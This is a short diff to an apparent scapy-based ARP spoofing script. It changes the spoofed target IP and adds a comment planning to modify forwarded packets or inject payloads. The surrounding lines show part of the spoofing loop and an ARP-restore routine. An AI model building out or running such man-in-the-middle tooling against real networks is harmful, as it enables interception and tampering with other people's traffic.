@@ -50,10 +50,11 @@ def restore_router_arp_table(target_ip, spoofed_ip):
     scapy.sendp(ether / arp, verbose=False)
     print(Fore.GREEN + f"[+] Restoring {target_ip} to its original state.")
 
+#NOTE ToAdd: Edit packets before forwarding them to modify data or inject payloads.
 
 if __name__ =="__main__":
     target_ip = "192.168.1.1"  # Default gateway IP
-    spoofed_ip = "192.168.1.102" # Target IP address to spoof
+    spoofed_ip = "192.168.1.123" # Target IP address to spoof
     try:
         target_mac = GetMacFromIP(target_ip)
         while True:
